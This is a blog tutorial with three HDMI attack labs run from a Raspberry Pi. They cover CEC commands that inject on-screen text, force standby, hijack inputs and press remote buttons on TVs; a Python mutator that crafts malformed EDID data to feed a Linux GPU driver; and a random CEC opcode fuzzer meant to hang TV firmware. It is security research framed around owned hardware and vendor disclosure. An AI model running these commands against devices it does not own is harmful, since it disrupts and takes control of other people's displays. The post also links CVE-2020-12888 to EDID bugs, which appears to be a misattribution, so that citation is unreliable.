---
title: "HDMI Attack Surface, Part 2: Three Practical Labs You Can Actually Run This Weekend"
date: "2026-04-25"
description: "A hands-on follow-up to the HDMI deep dive. Three real labs: CEC reconnaissance and OSD injection on a real TV, malicious EDID delivery from a Raspberry Pi, and a CEC opcode fuzzer that has found parser hangs in shipping firmware. Hardware list, exact commands, scripts, and links to the existing testbeds and tools that already exist on GitHub."
tags: ["HDMI", "CEC", "EDID", "hardware hacking", "fuzzing", "lab", "tutorial"]
---

*Reading about HDMI attacks is one thing. Plugging a Raspberry Pi into your living-room TV and watching it scan, inject text on the screen, and crash the scaler firmware is another. This post is the practical follow-up. Three labs. Two parts of hardware that cost under fifty dollars between them. Every command verified.*

---

### <span style="color: orange;">Lab Hardware Bill of Materials</span>

You can run all three labs with the same kit:

| Item | Why | Approx Cost |
|---|---|---|
| Raspberry Pi 4 (or 5, or 3B+) | Built-in CEC, DDC, and HDMI output. The cheapest CEC-capable platform. | $35-$80 |
| HDMI cable, 1 m | Direct path to the device under test. | $5 |
| HDMI splitter (passive 1x2) | Lets you keep watching the TV while attacking it. Optional. | $10 |
| Spare HDMI cable, sacrificial | For the EDID lab if you want to tap DDC pins directly. | $5 |
| FT232H board (Adafruit or clone) | Optional, only if you want to MITM DDC without using the Pi. | $15 |
| 24LC256 EEPROM in DIP-8 | Only if you want to build a static malicious-EDID dongle. | $1 |
| Logic analyzer (any 8-channel sigrok-compatible) | For watching CEC frames on the wire. Saleae clone is fine. | $10-$20 |

Target devices: any HDMI-CEC-enabled TV, AV receiver, soundbar, or set-top box. CEC is marketed under vendor names: **Anynet+** (Samsung), **Bravia Sync** (Sony), **Simplink** (LG), **Viera Link** (Panasonic), **Aquos Link** (Sharp), **EasyLink** (Philips). Most TVs ship with it on by default.

A note on permission: only run these labs on hardware you own. CEC traffic propagates across HDMI splitters and AV receivers, so be careful in shared environments.

---

### <span style="color: orange;">Lab 0: One-Time Pi Setup</span>

Flash a current Raspberry Pi OS Lite. SSH in. Then:

```bash
sudo apt update
sudo apt install -y cec-utils libcec-dev libcec6 python3-pip \
                    edid-decode read-edid i2c-tools \
                    git build-essential
pip3 install --user cec
```

Enable CEC support (it is on by default on Pi OS, but verify):

```bash
echo "scan" | cec-client -s -d 1
```

If you see a list of devices including your TV, the Pi can talk CEC. If you see "no device found on port", check that the HDMI cable is fully seated and that the TV has CEC enabled in its menu (look for the vendor name above).

To enable DDC/I2C access from userspace for the EDID lab:

```bash
sudo raspi-config nonint do_i2c 0
sudo modprobe i2c-dev
ls /dev/i2c-*
```

The HDMI-side DDC bus on a Pi 4 is exposed as `/dev/i2c-2` once `dtparam=i2c_vc=on` is set in `/boot/firmware/config.txt`. Add the line, reboot, verify.

---

### <span style="color: orange;">Lab 1: CEC Recon and OSD Injection on a Real TV</span>

**Goal:** plug into a TV, enumerate every device on the HDMI chain, fingerprint the vendor, then make the TV display attacker-controlled text on its on-screen display.

**Bug class:** CEC has no authentication. The `<Set OSD String>` opcode (0x64) is accepted from any logical address.

#### Step 1: Topology scan

```bash
echo "scan" | cec-client -s -d 1
```

You will get something like:

```
device #0: TV
address:       0.0.0.0
active source: no
vendor:        Samsung
osd string:    TV
CEC version:   1.4
power status:  on

device #1: Recorder 1
address:       1.0.0.0
active source: yes
vendor:        Pulse-Eight
osd string:    CECTester
power status:  on
```

The Pi presents itself as `Recorder 1` (logical 1) by default. The TV is always logical 0. Soundbars and AV receivers are typically logical 5. Set-top boxes are 3 or 4.

#### Step 2: Vendor fingerprinting

```bash
echo "tx 10:8C" | cec-client -s -d 1
```

Header `0x10` is "from logical 1, to logical 0". Opcode `0x8C` is `<Give Device Vendor ID>`. The reply will be a `<Device Vendor ID>` (opcode `0x87`) with a 24-bit IEEE OUI. Look it up at the IEEE OUI database. You now know which vendor's CEC stack you are talking to, which lets you target known vendor-specific opcodes.

#### Step 3: OSD injection

```bash
echo "tx 10:64:00:48:65:6c:6c:6f:20:50:77:6e:65:64" | cec-client -s -d 1
```

Frame breakdown:
- `10` - from 1, to 0 (TV)
- `64` - opcode `<Set OSD String>`
- `00` - display control: 0x00 = "display for default time", 0x40 = "display until cleared", 0x80 = "clear previous"
- `48 65 6c 6c 6f 20 50 77 6e 65 64` - ASCII "Hello Pwned"

On most Samsung, LG, and Sony TVs, this string will show on the TV's status bar for a few seconds. On older firmware, `0x40` ("display until cleared") sticks until you reboot the TV.

#### Step 4: Power and input control

```bash
echo "tx 10:36" | cec-client -s -d 1   # standby the TV
echo "tx 10:04" | cec-client -s -d 1   # image view on
echo "tx 1F:82:10:00" | cec-client -s -d 1   # broadcast: I am active source on physical 1.0.0.0
```

`0x1F` is the broadcast logical address. `<Active Source>` (`0x82`) takes a 16-bit physical address as operands. This lets you forcibly steal focus from whatever input the user is on.

#### Step 5: Remote-button injection

```bash
echo "tx 10:44:01" | cec-client -s -d 1   # press "Up"
echo "tx 10:45" | cec-client -s -d 1      # release
```

Opcode `0x44` is `<User Control Pressed>` and the operand is a UI command. `0x01` = up, `0x02` = down, `0x03` = left, `0x04` = right, `0x00` = select, `0x09` = root menu, `0x0D` = exit. On smart TVs you can navigate menus, open apps, and on some firmware launch the browser this way.

If the TV has a YouTube or browser app pre-installed, a sequence of `<User Control Pressed>` frames is enough to open it and navigate to a URL. This is a real attack scenario for hostile public displays.

#### Existing tools to extend this

- **libcec** ([Pulse-Eight/libcec](https://github.com/Pulse-Eight/libcec)) - the C library `cec-client` is built on. Use this if you want to write your own attacker tool.
- **python-cec** ([trainman419/python-cec](https://github.com/trainman419/python-cec)) - clean Python bindings. Great for scripting.
- **cec-o-matic** (web tool) - decodes CEC frames byte by byte. Useful when you sniff with a logic analyzer.

---

### <span style="color: orange;">Lab 2: Malicious EDID Delivery from a Raspberry Pi</span>

**Goal:** present a crafted EDID to a host computer's GPU and observe how its driver and compositor handle malformed data. This is where you find real parser bugs.

**Bug class:** EDID parsers in kernel DRM, in Xorg, and in TV scaler firmware accept a 128-byte base block plus extension blocks. Several extension types (CEA, DisplayID, vendor-specific) declare their own length fields. Parsers historically trust those length fields. We are going to lie about them.

#### Step 1: Capture a real EDID first

On a Linux host with the target monitor connected:

```bash
sudo get-edid | parse-edid > monitor.edid
edid-decode monitor.edid
```

This gives you a known-good baseline. Save the raw 128 (or 256) bytes for the next step.

#### Step 2: Craft a malicious EDID

Two routes. The lazy route is to start from a known good EDID and corrupt one field at a time. The thorough route is to use [linuxhw/EDID](https://github.com/linuxhw/EDID) as a corpus and mutate.

A simple Python mutator:

```python
#!/usr/bin/env python3
import sys, random, struct

with open("monitor.edid", "rb") as f:
    edid = bytearray(f.read())

# EDID base is 128 bytes, byte 126 = number of extension blocks
ext_count = edid[126]
print(f"baseline has {ext_count} extension block(s)")

# Mutation 1: lie about extension block count
edid[126] = 0xFF

# Mutation 2: corrupt CEA extension block tag-data length
# CEA block starts at offset 128 if present
if ext_count > 0:
    # CEA-861 data block collection starts at byte 4 of the extension
    # First byte: tag (top 3 bits) | length (bottom 5 bits)
    edid[128 + 4] = 0xFF  # tag = 7, length = 31

# Recompute checksum on base block (must sum to 0 mod 256)
edid[127] = (256 - (sum(edid[0:127]) % 256)) % 256

with open("evil.edid", "wb") as f:
    f.write(edid)
```

#### Step 3: Serve the malicious EDID from the Pi

The Pi 4 can act as an HDMI source. To serve a custom EDID to the device on the *other* end, you actually need to act as a sink. The cheapest way is to use a tool that exposes the Pi's HDMI input or to use a USB HDMI capture dongle that lets you override its EDID.

The cleanest setup uses an FT232H acting as I2C-slave on a tapped HDMI cable. Connect:

- HDMI pin 15 (SCL) -> FT232H D0
- HDMI pin 16 (SDA) -> FT232H D1
- HDMI pin 17 (GND) -> FT232H GND

Run [pyftdi](https://github.com/eblot/pyftdi) in I2C-slave mode at address `0x50` and respond to reads with `evil.edid`. There is a working reference at [smerschjohann/edid-emulator](https://github.com/smerschjohann/edid-emulator) and a more polished one at [tomverbeure/edid_emulator](https://github.com/tomverbeure/edid_emulator).

For a software-only setup against a Linux host, you can override EDID kernel-side without any hardware:

```bash
sudo cp evil.edid /lib/firmware/edid/evil.bin
# add to /etc/default/grub:
# GRUB_CMDLINE_LINUX_DEFAULT="drm.edid_firmware=HDMI-A-1:edid/evil.bin"
sudo update-grub
sudo reboot
```

After reboot, watch `dmesg` and the X/Wayland logs:

```bash
sudo dmesg -w | grep -iE "edid|drm"
```

A well-formed mutation produces warnings like:

```
[drm] EDID checksum is invalid, remainder is 42
[drm] Invalid CEA extension block
```

A bad mutation produces a kernel WARN_ON or, on older kernels, a crash. The patch history of `drivers/gpu/drm/drm_edid.c` is full of fixes for these.

#### Step 4: Reproduce a known bug

Try CVE-2020-12888 family bugs. The pattern is: declare a CEA extension with `Vendor-Specific Data Block` whose length byte exceeds the remaining bytes in the block. Older kernels read past the buffer. Newer ones log and skip. Either way, you have evidence the parser saw your bytes.

For Xorg specifically, oversized DTD pixel-clock values combined with malformed sync polarities have triggered crashes in `xf86-video-modesetting`. The corpus at [linuxhw/EDID](https://github.com/linuxhw/EDID) contains real EDIDs from over 100,000 devices, many of which already trip warnings in `edid-decode --check`. Run that against the corpus to find existing weird ones to start from.

#### Existing tools and testbeds

- **edid-decode** ([linuxtv/edid-decode](https://git.linuxtv.org/edid-decode.git)) - the reference parser by Hans Verkuil. Use it as a ground-truth comparator.
- **linuxhw/EDID** ([linuxhw/EDID](https://github.com/linuxhw/EDID)) - massive EDID corpus. Mutate from this.
- **AnalogJ/edid** ([AnalogJ/edid](https://github.com/AnalogJ/edid)) - Python EDID parser/builder. Useful for crafting.
- **tomverbeure/edid_emulator** ([tomverbeure/edid_emulator](https://github.com/tomverbeure/edid_emulator)) - FT232H-based DDC sink emulator.
- **DanielTillett/Simple-Linux-EDID-Editor** - GUI EDID editor for Linux.
- **CRU** (Custom Resolution Utility) - Windows-side EDID editor, useful for crafting on Windows targets.

---

### <span style="color: orange;">Lab 3: A CEC Opcode Fuzzer That Actually Finds Hangs</span>

**Goal:** write a small fuzzer that walks every legal and many illegal opcode/operand combinations against a target TV and logs which ones cause hangs, reboots, or unexpected behavior. This has found parser bugs in shipping firmware in the past.

**Bug class:** CEC parsers are written in C, often without bounds checking, often handling vendor opcodes via a `switch` with a default case that assumes operand sizes. Lying about operand length, or feeding the wrong operand types, breaks them.

#### Step 1: The fuzzer

Save as `cec_fuzz.py` on the Pi:

```python
#!/usr/bin/env python3
"""
Dumb CEC fuzzer. Walks every opcode 0x00..0xFF, sending them with a
randomized operand payload of 0..14 bytes. Watches for missing acks,
which usually mean the receiver hung or rebooted.
"""
import cec, random, time, sys, signal, json

cec.init()
devices = cec.list_devices()
print(f"devices: {devices}")

target = 0  # TV is always logical 0
src    = 1  # we are recorder 1

results = []

def send(opcode, operands):
    header = (src << 4) | target
    frame = bytes([header, opcode]) + operands
    try:
        ok = cec.transmit(target, opcode, operands)
        return ok
    except Exception as e:
        return f"exc:{e}"

signal.signal(signal.SIGINT, lambda *a: (json.dump(results, open("cec_fuzz.json","w")), sys.exit(0)))

for opcode in range(0x00, 0x100):
    for trial in range(8):
        n = random.randint(0, 14)
        operands = bytes(random.randint(0,255) for _ in range(n))
        before = time.time()
        ok = send(opcode, operands)
        elapsed = time.time() - before

        # poll the TV after each send to detect hang/reboot
        responsive = cec.is_active_source(target) is not None
        results.append({
            "opcode": opcode, "operands": operands.hex(),
            "ack": ok, "elapsed": elapsed, "responsive": responsive
        })

        if not responsive:
            print(f"[!] TV unresponsive after opcode {opcode:#04x} operands {operands.hex()}")
            # wait for it to come back
            for _ in range(30):
                time.sleep(2)
                if cec.is_active_source(target) is not None:
                    break
            else:
                print(f"[!!] hard hang after {opcode:#04x} {operands.hex()}, save and exit")
                json.dump(results, open("cec_fuzz.json","w"))
                sys.exit(1)

json.dump(results, open("cec_fuzz.json","w"))
```

Run it:

```bash
python3 cec_fuzz.py
```

This will take a few hours. It is dumb fuzzing, no coverage feedback, no smart mutation. It still works because consumer firmware has so little input validation.

#### Step 2: Triage results

Sort `cec_fuzz.json` by `responsive == False`. Each unresponsive entry is a candidate. To reproduce, isolate the opcode and the exact operands and re-send manually with `cec-client`:

```bash
echo "tx 10:<opcode>:<operands>" | cec-client -s -d 1
```

If the same opcode reliably hangs the TV, you have a reproducible parser bug. If it only happens with specific operand bytes, you may have memory corruption. If it triggers a reboot, you have likely caused a watchdog reset, which is usually a heap corruption that the firmware noticed before crashing.

#### Step 3: Disclose responsibly

If you find a real bug:
1. Note the exact firmware version (`Settings -> Support -> Software Information`).
2. Document the minimal reproducer.
3. Email the vendor's security team. Samsung, LG, Sony, and Panasonic all have product security disclosure addresses.
4. Wait. Patches for TV firmware can take 6 to 12 months.

#### Existing testbeds

- **HDMI-Walk research artifact** - the original paper's tooling was partial; the closest public reimplementation is in academic forks. Search GitHub for "HDMI-Walk".
- **cec-fuzzer** on GitHub - several toy fuzzers exist; the one above is purposely simple but you can swap in [boofuzz](https://github.com/jtpereyda/boofuzz) for grammar-aware fuzzing.
- **Pulse-Eight test harness** - libcec ships with `cec-client` and `cec-tray`, useful for replaying captured frames.
- **CEC framework in Linux kernel** - `drivers/media/cec/` includes a kernel-side CEC stack, and you can fuzz that directly with syzkaller using the `cec` syscall description.

---

### <span style="color: orange;">A Note on the Logic Analyzer</span>

For all three labs, having a cheap 8-channel logic analyzer with sigrok and PulseView open in the background is invaluable. Tap CEC (pin 13) and the DDC pair (pins 15-16) on a sacrificial cable. Then:

```bash
sudo apt install sigrok-cli pulseview
```

In PulseView, add a CEC protocol decoder (it is built in). You will see frames decoded byte by byte, with the source/destination logical addresses, opcode names, and operand bytes. This is the fastest way to confirm what your tools are actually transmitting and to capture what other devices on the bus are doing without you.

---

### <span style="color: orange;">What to Try Next</span>

Once you have these three labs working, the natural next steps are:

1. **MITM HDMI** with a board like the [HDMI2USB](https://hdmi2usb.tv/) or [tomverbeure/hdmi_demo](https://github.com/tomverbeure/hdmi_demo) FPGA-based platforms. This lets you sit between a source and a sink and modify CEC and DDC traffic in real time.
2. **TEMPEST capture** with an SDR. Start with a HackRF One and the `gr-tempest` GNU Radio module ([git-artes/gr-tempest](https://github.com/git-artes/gr-tempest)) and build up to the [emidan22/deep-tempest](https://github.com/emidan22/deep-tempest) reproduction.
3. **CEC over malicious-content channel.** The `<Vendor Command>` opcode (`0x89`) and `<Vendor Command With ID>` (`0xA0`) accept arbitrary vendor-defined payloads up to 14 bytes. Build a covert channel over them.

The point of this post is that none of this requires expensive equipment or rare expertise. A Raspberry Pi, a TV, and a weekend will get you to the edge of where most public HDMI security research stops. The interesting bugs live just past that edge.

---

### <span style="color: orange;">Reference Repository List</span>

- [Pulse-Eight/libcec](https://github.com/Pulse-Eight/libcec)
- [trainman419/python-cec](https://github.com/trainman419/python-cec)
- [linuxtv/edid-decode](https://git.linuxtv.org/edid-decode.git)
- [linuxhw/EDID](https://github.com/linuxhw/EDID)
- [AnalogJ/edid](https://github.com/AnalogJ/edid)
- [tomverbeure/edid_emulator](https://github.com/tomverbeure/edid_emulator)
- [smerschjohann/edid-emulator](https://github.com/smerschjohann/edid-emulator)
- [eblot/pyftdi](https://github.com/eblot/pyftdi)
- [git-artes/gr-tempest](https://github.com/git-artes/gr-tempest)
- [emidan22/deep-tempest](https://github.com/emidan22/deep-tempest)
- [jtpereyda/boofuzz](https://github.com/jtpereyda/boofuzz)
- [google/syzkaller](https://github.com/google/syzkaller) (CEC subsystem support)

Run them on hardware you own, log everything, disclose what you find.
